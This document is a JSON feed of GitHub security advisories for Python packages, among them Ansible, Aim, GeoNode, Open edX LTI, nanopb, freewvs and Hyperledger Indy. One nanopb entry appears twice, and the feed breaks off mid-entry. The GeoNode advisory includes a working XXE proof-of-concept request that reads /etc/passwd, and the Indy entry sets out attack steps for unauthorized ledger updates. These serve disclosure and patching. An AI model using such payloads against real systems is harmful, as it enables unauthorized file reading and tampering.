{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>The chroot, jail, and zone connection plugins in ansible before 1.9.2 allow local users to escape a restricted environment via a symlink attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2015-6240\">https://nvd.nist.gov/vuln/detail/CVE-2015-6240</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/952166f48eb0f5797b75b160fd156bbe1e8fc647\">https://github.com/ansible/ansible/commit/952166f48eb0f5797b75b160fd156bbe1e8fc647</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/ca2f2c4ebd7b5e097eab0a710f79c1f63badf95b\">https://github.com/ansible/ansible/commit/ca2f2c4ebd7b5e097eab0a710f79c1f63badf95b</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=1243468\">https://bugzilla.redhat.com/show_bug.cgi?id=1243468</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2019/09/msg00016.html\">https://lists.debian.org/debian-lts-announce/2019/09/msg00016.html</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2015/08/17/10\">http://www.openwall.com/lists/oss-security/2015/08/17/10</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/ansible/PYSEC-2017-3.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/ansible/PYSEC-2017-3.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wwwh-47wp-m522\">https://github.com/advisories/GHSA-wwwh-47wp-m522</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wwwh-47wp-m522",
            "title": "[ansible] Ansible Sandbox Escape via Symlink Attack",
            "date_modified": "2024-08-30T22:01:32.000Z",
            "date_published": "2022-05-13T01:54:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wwwh-47wp-m522"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A path traversal attack aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files.</p>\n<p>Vulnerable code: <a href=\"https://github.com/aimhubio/aim/blob/0b99c6ca08e0ba7e7011453a2f68033e9b1d1bce/aim/web/api/views.py#L9-L16\">https://github.com/aimhubio/aim/blob/0b99c6ca08e0ba7e7011453a2f68033e9b1d1bce/aim/web/api/views.py#L9-L16</a></p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability issue is resolved in Aim v3.1.0.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://owasp.org/www-community/attacks/Path_Traversal\">https://owasp.org/www-community/attacks/Path_Traversal</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aimhubio/aim/security/advisories/GHSA-8phj-f9w2-cjcc\">https://github.com/aimhubio/aim/security/advisories/GHSA-8phj-f9w2-cjcc</a></li>\n<li><a href=\"https://github.com/aimhubio/aim/pull/1003\">https://github.com/aimhubio/aim/pull/1003</a></li>\n<li><a href=\"https://github.com/aimhubio/aim/blob/0b99c6ca08e0ba7e7011453a2f68033e9b1d1bce/aim/web/api/views.py#L9-L16\">https://github.com/aimhubio/aim/blob/0b99c6ca08e0ba7e7011453a2f68033e9b1d1bce/aim/web/api/views.py#L9-L16</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-43775\">https://nvd.nist.gov/vuln/detail/CVE-2021-43775</a></li>\n<li><a href=\"https://github.com/aimhubio/aim/issues/999\">https://github.com/aimhubio/aim/issues/999</a></li>\n<li><a href=\"https://github.com/aimhubio/aim/commit/b9e53df5e32d14bbd3a2c738e2db7187fb531e93\">https://github.com/aimhubio/aim/commit/b9e53df5e32d14bbd3a2c738e2db7187fb531e93</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/aim/PYSEC-2021-839.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/aim/PYSEC-2021-839.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8phj-f9w2-cjcc\">https://github.com/advisories/GHSA-8phj-f9w2-cjcc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8phj-f9w2-cjcc",
            "title": "[aim] Arbitrary file reading vulnerability in Aim",
            "date_modified": "2024-08-30T21:51:41.000Z",
            "date_published": "2021-11-23T22:03:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8phj-f9w2-cjcc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Adyen has utility methods for validating notification HMAC signatures. The <code>is_valid_hmac</code> and <code>is_valid_hmac_notification</code> methods are vulnerable to a timing attack, you should compare the hash of the HMACs instead.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Adyen/adyen-python-api-library/issues/168\">https://github.com/Adyen/adyen-python-api-library/issues/168</a></li>\n<li><a href=\"https://github.com/Adyen/adyen-python-api-library/pull/170\">https://github.com/Adyen/adyen-python-api-library/pull/170</a></li>\n<li><a href=\"https://github.com/Adyen/adyen-python-api-library/commit/3292133dbc00ffc4cccfb92de672a76eaa587ca5\">https://github.com/Adyen/adyen-python-api-library/commit/3292133dbc00ffc4cccfb92de672a76eaa587ca5</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/adyen/PYSEC-2023-1.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/adyen/PYSEC-2023-1.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f3q4-ggfp-jv34\">https://github.com/advisories/GHSA-f3q4-ggfp-jv34</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f3q4-ggfp-jv34",
            "title": "[Adyen] Adyen APIs Library for Python timing attack vulnerability",
            "date_modified": "2024-08-30T18:51:59.000Z",
            "date_published": "2024-08-30T18:51:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f3q4-ggfp-jv34"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>GeoNode is vulnerable to an XML External Entity (XXE) injection in the style upload functionality of GeoServer leading to Arbitrary File Read.</p>\n<h3 id=\"details\">Details</h3>\n<p>GeoNode's GeoServer has the ability to upload new styles for datasets through the <a href=\"https://github.com/GeoNode/geonode/blob/99b0557da5c7db23c72ad39e466b88fe43edf82d/geonode/geoserver/urls.py#L70-L72\"><code>dataset_style_upload</code> view</a>.</p>\n<pre><code class=\"language-py\"># https://github.dev/GeoNode/geonode/blob/99b0557da5c7db23c72ad39e466b88fe43edf82d/geonode/geoserver/views.py#L158-L159\n@login_required\ndef dataset_style_upload(request, layername):\n    def respond(*args, **kw):\n        kw['content_type'] = 'text/html'\n        return json_response(*args, **kw)\n    ...\n    sld = request.FILES['sld'].read() # 1\n    sld_name = None\n    try:\n        # Check SLD is valid\n        ...\n        sld_name = extract_name_from_sld(gs_catalog, sld, sld_file=request.FILES['sld']) # 2\n    except Exception as e:\n        respond(errors=f\"The uploaded SLD file is not valid XML: {e}\")\n    name = data.get('name') or sld_name\n    set_dataset_style(layer, data.get('title') or name, sld)\n    return respond(\n        body={\n            'success': True,\n            'style': data.get('title') or name, # 3\n            'updated': data['update']})\n</code></pre>\n<p><code>dataset_style_upload</code> gets a user-provided file (<code>1</code>), pass it to <code>extract_name_from_sld</code> to extract an element from it (<code>2</code>) and return the former in the response (<code>3</code>).</p>\n<pre><code class=\"language-py\"># https://github.dev/GeoNode/geonode/blob/99b0557da5c7db23c72ad39e466b88fe43edf82d/geonode/geoserver/helpers.py#L233-L234\ndef extract_name_from_sld(gs_catalog, sld, sld_file=None):\n    try:\n        if sld:\n            if isfile(sld):\n                with open(sld, \"rb\") as sld_file:\n                    sld = sld_file.read() # 1\n            if isinstance(sld, str):\n                sld = sld.encode('utf-8')\n            dom = etree.XML(sld) # 2\n        ...\n    named_dataset = dom.findall(\n        \"{http://www.opengis.net/sld}NamedLayer\")\n    el = None\n    if named_dataset and len(named_dataset) &gt; 0:\n        user_style = named_dataset[0].findall(\"{http://www.opengis.net/sld}UserStyle\")\n        if user_style and len(user_style) &gt; 0:\n            el = user_style[0].findall(\"{http://www.opengis.net/sld}Name\") # 3\n    ...\n    return el[0].text # 4\n</code></pre>\n<p><code>extract_name_from_sld</code> uses <code>sld</code> (which is a path to the provided file), reads it (<code>1</code>) and parses it with <a href=\"https://github.com/python/cpython/blob/22d91c16bb03c3d87f53b5fee10325b876262a78/Lib/xml/etree/ElementTree.py#L1312\"><code>etree.XML</code></a> in <code>2</code>. Since the former uses a <a href=\"https://github.com/python/cpython/blob/22d91c16bb03c3d87f53b5fee10325b876262a78/Lib/xml/etree/ElementTree.py#L1323-L1324\">default XMLParser</a>, the parsing gets done with the <a href=\"https://lxml.de/api/lxml.etree.XMLParser-class.html#:~:text=resolve_entities%3DTrue\"><code>resolve_entities</code> flag set to <code>True</code></a>. Therefore, <code>dom</code> handles the parsed XML containing the resolved entity (<code>2</code>), gets <code>NamedLayer.UserStyle.Name</code> in <code>3</code> and returns the resolved content in <code>4</code>.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Create a guest/non-privileged account and log in.</li>\n<li>Upload a dataset through <code>/catalogue/#/upload/dataset</code> whose name we will be referencing as <code>&lt;DATASET_NAME&gt;</code>.</li>\n<li>Send the following request that will try to upload a new style for the dataset. The response will be returning the resolved entity with the contents of <code>/etc/passwd</code>:</li>\n</ol>\n<pre><code>POST /gs/geonode:&lt;DATASET_NAME&gt;/style/upload HTTP/1.1\nHost: localhost\nCookie: django_language=en-us; csrftoken=&lt;CSRF-TOKEN&gt;; sessionid=&lt;SESSION-COOKIE&gt;\nX-Csrftoken: &lt;CSRF-TOKEN&gt;\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryfoo\nContent-Length: 485\n------WebKitFormBoundaryfoo\nContent-Disposition: form-data; name=\"layerid\"\n1\n------WebKitFormBoundaryfoo\nContent-Disposition: form-data; name=\"sld\"; filename=\"foo.sld\"\nContent-Type: application/octet-stream\n&lt;?xml version=\"1.0\" standalone=\"yes\"?&gt;\n&lt;!DOCTYPE foo [ &lt;!ENTITY ent SYSTEM \"/etc/passwd\" &gt; ]&gt;\n&lt;foo xmlns=\"http://www.opengis.net/sld\"&gt;\n  &lt;NamedLayer&gt;\n    &lt;UserStyle&gt;\n        &lt;Name&gt;&amp;ent;&lt;/Name&gt;\n    &lt;/UserStyle&gt;\n  &lt;/NamedLayer&gt;\n&lt;/foo&gt;\n------WebKitFormBoundaryfoo--\n</code></pre>\n<p>Sample response:</p>\n<pre><code>HTTP/1.1 200 OK\nServer: nginx/1.23.2\n...\n{\"success\": true, \"style\": \"root:x:0:0:root:/root:/bin/bash...\", \"updated\": false}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This issue may lead to authenticated <code>Arbitrary File Read</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/GeoNode/geonode/security/advisories/GHSA-mcmc-c59m-pqq8\">https://github.com/GeoNode/geonode/security/advisories/GHSA-mcmc-c59m-pqq8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-26043\">https://nvd.nist.gov/vuln/detail/CVE-2023-26043</a></li>\n<li><a href=\"https://github.com/GeoNode/geonode/commit/2fdfe919f299b21f1609bf898f9dcfde58770ac0\">https://github.com/GeoNode/geonode/commit/2fdfe919f299b21f1609bf898f9dcfde58770ac0</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/geonode/PYSEC-2023-15.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/geonode/PYSEC-2023-15.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mcmc-c59m-pqq8\">https://github.com/advisories/GHSA-mcmc-c59m-pqq8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mcmc-c59m-pqq8",
            "title": "[GeoNode] GeoServer style upload functionality vulnerable to XML External Entity (XXE) injection",
            "date_modified": "2024-08-30T18:50:02.000Z",
            "date_published": "2024-08-30T18:50:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mcmc-c59m-pqq8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"problem\">Problem</h3>\n<p>TL;DR: Any LTI tool that is integrated with on the Open edX platform can\npost a grade back for any LTI XBlock so long as it knows or can guess the\nblock location for that XBlock.</p>\n<p>In LTI 1.3, LTI tools can \"pass back\" scores that learners earn while using\nLTI tools to the edX platform. The edX platform then stores those LTI\nscores in a separate table. If the right conditions are met, these scores\nare then persisted to the LMS grades tables.</p>\n<p>LTI tools can create what are called \"line items\" on the edX platform. A\nline item can be thought of as a column in a grade book; it stores results\nfor a specific activity (i.e. XBlock) for a specific set of users (i.e.\nusers in the course using the XBlock). A line item has an optional\nresource_link_id field, which is basically the XBlock location. An LTI tool\ncan supply any value for this field.</p>\n<p>An LTI tool submits scores to the edX platform for line items. The code\nthat uploads that score to the LMS grade tables determines which XBlock to\nupload the grades for by reading the resource_link_id field of the\nassociated line item. Because the LTI tool could have submitted any value\nfor the resource_link_id field, this introduces the potential for a\nnefarious LTI tool to submit scores for any LTI XBlock on the platform.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Any LTI tool that is integrated with on the Open edX platform can post a\ngrade back for any LTI XBlock so long as it knows the resource_link_id\n(i.e. block location) for that XBlock.</p>\n<p>The impact is a loss of integrity for LTI XBlock grades.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>No available patch</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openedx/xblock-lti-consumer/security/advisories/GHSA-7j9p-67mm-5g87\">https://github.com/openedx/xblock-lti-consumer/security/advisories/GHSA-7j9p-67mm-5g87</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-23611\">https://nvd.nist.gov/vuln/detail/CVE-2023-23611</a></li>\n<li><a href=\"https://github.com/openedx/xblock-lti-consumer/commit/252f94bd182cd0962af9251015930cb55ec515d7\">https://github.com/openedx/xblock-lti-consumer/commit/252f94bd182cd0962af9251015930cb55ec515d7</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/lti-consumer-xblock/PYSEC-2023-21.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/lti-consumer-xblock/PYSEC-2023-21.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7j9p-67mm-5g87\">https://github.com/advisories/GHSA-7j9p-67mm-5g87</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7j9p-67mm-5g87",
            "title": "[lti-consumer-xblock] LTI 1.3 Grade Pass Back Implementation has Missing Authorization Vulnerability",
            "date_modified": "2024-08-30T18:47:15.000Z",
            "date_published": "2024-08-30T18:47:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7j9p-67mm-5g87"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Decoding a specifically formed message can cause invalid <code>free()</code> or <code>realloc()</code> calls if the message type contains an <code>oneof</code> field, and the <code>oneof</code> directly contains both a pointer field and a non-pointer field. If the message data first contains the non-pointer field and then the pointer field, the data of the non-pointer field is incorrectly treated as if it was a pointer value. Such message data rarely occurs in normal messages, but it is a concern when untrusted data is parsed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Preliminary patch is available on git for <a href=\"https://github.com/nanopb/nanopb/commit/e2f0ccf939d9f82931d085acb6df8e9a182a4261\">0.4.x</a> and <a href=\"https://github.com/nanopb/nanopb/commit/4a375a560651a86726e5283be85a9231fd0efe9c\">0.3.x</a> branches. The fix will be released in versions 0.3.9.8 and 0.4.5 once testing has been completed.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Following workarounds are available:</p>\n<ul>\n<li>Set the option <code>no_unions</code> for the oneof field. This will generate fields as separate instead of C union, and avoids triggering the problematic code.</li>\n<li>Set the type of all fields inside the oneof to <code>FT_POINTER</code>. This ensures that the data contained inside the <code>union</code> is always a valid pointer.</li>\n<li>Heap implementations that guard against invalid <code>free()</code> provide a partial mitigation. Depending on the message type, the pointer value may be attacker controlled and can be used to bypass heap protections.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<p>Bug report: <a href=\"https://github.com/nanopb/nanopb/issues/647\">https://github.com/nanopb/nanopb/issues/647</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory, comment on the bug report linked above.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nanopb/nanopb/security/advisories/GHSA-7mv5-5mxh-qg88\">https://github.com/nanopb/nanopb/security/advisories/GHSA-7mv5-5mxh-qg88</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-21401\">https://nvd.nist.gov/vuln/detail/CVE-2021-21401</a></li>\n<li><a href=\"https://github.com/nanopb/nanopb/issues/647\">https://github.com/nanopb/nanopb/issues/647</a></li>\n<li><a href=\"https://github.com/nanopb/nanopb/commit/4a375a560651a86726e5283be85a9231fd0efe9c\">https://github.com/nanopb/nanopb/commit/4a375a560651a86726e5283be85a9231fd0efe9c</a></li>\n<li><a href=\"https://github.com/nanopb/nanopb/commit/e2f0ccf939d9f82931d085acb6df8e9a182a4261\">https://github.com/nanopb/nanopb/commit/e2f0ccf939d9f82931d085acb6df8e9a182a4261</a></li>\n<li><a href=\"https://github.com/nanopb/nanopb/blob/c9124132a604047d0ef97a09c0e99cd9bed2c818/CHANGELOG.txt#L1\">https://github.com/nanopb/nanopb/blob/c9124132a604047d0ef97a09c0e99cd9bed2c818/CHANGELOG.txt#L1</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/nanopb/PYSEC-2021-432.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/nanopb/PYSEC-2021-432.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7mv5-5mxh-qg88\">https://github.com/advisories/GHSA-7mv5-5mxh-qg88</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7mv5-5mxh-qg88",
            "title": "[nanopb] nanopb vulnerable to invalid free() call with oneofs and PB_ENABLE_MALLOC",
            "date_modified": "2024-08-30T18:45:42.000Z",
            "date_published": "2024-08-30T18:45:41.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7mv5-5mxh-qg88"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Decoding a specifically formed message can cause invalid <code>free()</code> or <code>realloc()</code> calls if the message type contains an <code>oneof</code> field, and the <code>oneof</code> directly contains both a pointer field and a non-pointer field. If the message data first contains the non-pointer field and then the pointer field, the data of the non-pointer field is incorrectly treated as if it was a pointer value. Such message data rarely occurs in normal messages, but it is a concern when untrusted data is parsed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Preliminary patch is available on git for <a href=\"https://github.com/nanopb/nanopb/commit/e2f0ccf939d9f82931d085acb6df8e9a182a4261\">0.4.x</a> and <a href=\"https://github.com/nanopb/nanopb/commit/4a375a560651a86726e5283be85a9231fd0efe9c\">0.3.x</a> branches. The fix will be released in versions 0.3.9.8 and 0.4.5 once testing has been completed.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Following workarounds are available:</p>\n<ul>\n<li>Set the option <code>no_unions</code> for the oneof field. This will generate fields as separate instead of C union, and avoids triggering the problematic code.</li>\n<li>Set the type of all fields inside the oneof to <code>FT_POINTER</code>. This ensures that the data contained inside the <code>union</code> is always a valid pointer.</li>\n<li>Heap implementations that guard against invalid <code>free()</code> provide a partial mitigation. Depending on the message type, the pointer value may be attacker controlled and can be used to bypass heap protections.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<p>Bug report: <a href=\"https://github.com/nanopb/nanopb/issues/647\">https://github.com/nanopb/nanopb/issues/647</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory, comment on the bug report linked above.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nanopb/nanopb/security/advisories/GHSA-7mv5-5mxh-qg88\">https://github.com/nanopb/nanopb/security/advisories/GHSA-7mv5-5mxh-qg88</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-21401\">https://nvd.nist.gov/vuln/detail/CVE-2021-21401</a></li>\n<li><a href=\"https://github.com/nanopb/nanopb/issues/647\">https://github.com/nanopb/nanopb/issues/647</a></li>\n<li><a href=\"https://github.com/nanopb/nanopb/commit/4a375a560651a86726e5283be85a9231fd0efe9c\">https://github.com/nanopb/nanopb/commit/4a375a560651a86726e5283be85a9231fd0efe9c</a></li>\n<li><a href=\"https://github.com/nanopb/nanopb/commit/e2f0ccf939d9f82931d085acb6df8e9a182a4261\">https://github.com/nanopb/nanopb/commit/e2f0ccf939d9f82931d085acb6df8e9a182a4261</a></li>\n<li><a href=\"https://github.com/nanopb/nanopb/blob/c9124132a604047d0ef97a09c0e99cd9bed2c818/CHANGELOG.txt#L1\">https://github.com/nanopb/nanopb/blob/c9124132a604047d0ef97a09c0e99cd9bed2c818/CHANGELOG.txt#L1</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/nanopb/PYSEC-2021-432.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/nanopb/PYSEC-2021-432.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7mv5-5mxh-qg88\">https://github.com/advisories/GHSA-7mv5-5mxh-qg88</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7mv5-5mxh-qg88",
            "title": "[nanopb] nanopb vulnerable to invalid free() call with oneofs and PB_ENABLE_MALLOC",
            "date_modified": "2024-08-30T18:45:42.000Z",
            "date_published": "2024-08-30T18:45:41.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7mv5-5mxh-qg88"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A user could create a large file that freewvs will try to read, which will terminate a scan process.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This has been patched by limiting the data freewvs reads:\n<a href=\"https://github.com/schokokeksorg/freewvs/commit/18bbf2043e53f69e0119d24f8ae4edb274afb9b2\">https://github.com/schokokeksorg/freewvs/commit/18bbf2043e53f69e0119d24f8ae4edb274afb9b2</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/schokokeksorg/freewvs/security/advisories/GHSA-9cfv-9463-8gqv\">https://github.com/schokokeksorg/freewvs/security/advisories/GHSA-9cfv-9463-8gqv</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-15100\">https://nvd.nist.gov/vuln/detail/CVE-2020-15100</a></li>\n<li><a href=\"https://github.com/schokokeksorg/freewvs/commit/18bbf2043e53f69e0119d24f8ae4edb274afb9b2\">https://github.com/schokokeksorg/freewvs/commit/18bbf2043e53f69e0119d24f8ae4edb274afb9b2</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/freewvs/PYSEC-2020-232.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/freewvs/PYSEC-2020-232.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9cfv-9463-8gqv\">https://github.com/advisories/GHSA-9cfv-9463-8gqv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9cfv-9463-8gqv",
            "title": "[freewvs] freewvs vulnerable to denial of service through large files",
            "date_modified": "2024-08-30T18:44:00.000Z",
            "date_published": "2024-08-30T18:43:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9cfv-9463-8gqv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A directory structure of more than 1000 nested directories can interrupt a freewvs scan due to Python's recursion limit and os.walk(). This can be problematic in a case where an administrator scans the dirs of potentially untrusted users.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This has been fixed in this commit by limiting the recursion to 500 directories:\n<a href=\"https://github.com/schokokeksorg/freewvs/commit/83a6b55c0435c69f447488b791555e6078803143\">https://github.com/schokokeksorg/freewvs/commit/83a6b55c0435c69f447488b791555e6078803143</a></p>\n<p>This issue was discovered by Hanno Böck.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/schokokeksorg/freewvs/security/advisories/GHSA-7pmh-vrww-25xx\">https://github.com/schokokeksorg/freewvs/security/advisories/GHSA-7pmh-vrww-25xx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-15101\">https://nvd.nist.gov/vuln/detail/CVE-2020-15101</a></li>\n<li><a href=\"https://github.com/schokokeksorg/freewvs/commit/83a6b55c0435c69f447488b791555e6078803143\">https://github.com/schokokeksorg/freewvs/commit/83a6b55c0435c69f447488b791555e6078803143</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/freewvs/PYSEC-2020-233.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/freewvs/PYSEC-2020-233.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7pmh-vrww-25xx\">https://github.com/advisories/GHSA-7pmh-vrww-25xx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7pmh-vrww-25xx",
            "title": "[freewvs] freewvs's nested directory structure can interrupt scan",
            "date_modified": "2024-08-30T18:43:25.000Z",
            "date_published": "2024-08-30T18:43:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7pmh-vrww-25xx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1>Name</h1>\n<p>Updating a DID with a nym transaction will be written to the ledger if neither ROLE or VERKEY are being changed, regardless of sender.</p>\n<h1 id=\"description\">Description</h1>\n<p>A malicious DID with no particular role can ask an update for another DID (but cannot modify its verkey or role). This is bad because:</p>\n<ol>\n<li>Any DID can write a nym transaction to the ledger (i.e., any DID can spam the ledger with nym transactions).</li>\n<li>Any DID can change any other DID's alias. </li>\n<li>The update transaction modifies the ledger metadata associated with a DID.</li>\n</ol>\n<h1 id=\"expected-vs-observed\">Expected vs Observed</h1>\n<p>We expect that if a DID (with no role) wants to update another DID (not its own or one it is the endorser), then the nodes should refuse the request. We can see that requirements in the <a href=\"https://github.com/hyperledger/indy-node/blob/master/docs/source/auth_rules.md\">Indy default auth_rules</a> in Section \"Who is the owner\" in the last point of \"Endorser using\". </p>\n<p>We observe that with a normal DID, we can update the field <code>from</code> for a random DID, for example, the one of a TRUSTEE. It creates then a new transaction on the ledger.</p>\n<h1 id=\"explanation-of-the-attack\">Explanation of the attack</h1>\n<p>We first begin to connect to the pool and open a wallet. Then, we will use a TRUSTEE (but can also be a STEWARD or an ENDORSER) DID <code>V4SGRU86Z58d6TV7PBUe6f</code>. We ask the information about <code>V4SGRU86Z58d6TV7PBUe6f</code> with a get-nym. We create a new DID <code>V4SGRU86Z58d6TV7PBUe1a</code> signed by <code>V4SGRU86Z58d6TV7PBUe6f</code> with no role. For the rest of the attack, we will use <code>V4SGRU86Z58d6TV7PBUe1a</code> to sign new transactions. We send a <code>ledger nym did=V4SGRU86Z58d6TV7PBUe6f extra=hello</code> to see if <code>V4SGRU86Z58d6TV7PBUe1a</code> can send an update of a TRUSTEE identity. When we ask information to the ledger about <code>V4SGRU86Z58d6TV7PBUe6f</code>, it answers that the <code>from</code> field is <code>V4SGRU86Z58d6TV7PBUe1a</code> (to compare with the first get-nym we did with <code>from</code> field = <code>V4SGRU86Z58d6TV7PBUe6f</code>). To see the log of the attack, I modified my indy-cli to print the json request and the json response directly on the terminal. You can find the log file <code>indy.log</code> in this archive.</p>\n<h1 id=\"implementation-notes\">Implementation notes</h1>\n<p><a href=\"https://github.com/hyperledger/indy-node/blob/e5676b703d625e42c9547333bd03bb8307ed534c/indy_node/server/request_handlers/domain_req_handlers/nym_handler.py\">NymHandler</a> method <code>update_state</code>, line 62. I think that we need to check if the DID which signs the transaction, owns the DID or is its endorser.</p>\n<h1 id=\"steps-to-reproduce\">Steps to Reproduce</h1>\n<h2 id=\"environment\">Environment</h2>\n<p>Ubuntu 18.04\nDocker version 19.03.8\n<a href=\"https://github.com/hyperledger/indy-sdk/tree/master/cli\">indy-cli</a>\n<a href=\"https://github.com/hyperledger/indy-sdk/tree/master/ci\">indy-ci</a> Dockerfile is copied in this archive\nTo install indy-cli, run <code>./install_indy_cli.sh</code></p>\n<h2 id=\"command\">Command</h2>\n<p>Here is the script to create the container, run the attack and remove the container and the image. Find below the command to execute each step separately.</p>\n<pre><code>./full_attack.sh\n</code></pre>\n<h3 id=\"installation-of-the-environment\">Installation of the environment</h3>\n<p>Install indy-cli and create an image with tag <code>test</code> from Dockerfile</p>\n<pre><code>./install.sh\n</code></pre>\n<h3 id=\"exploit\">Exploit</h3>\n<pre><code>indy-cli proof_of_concept\n</code></pre>\n<h3 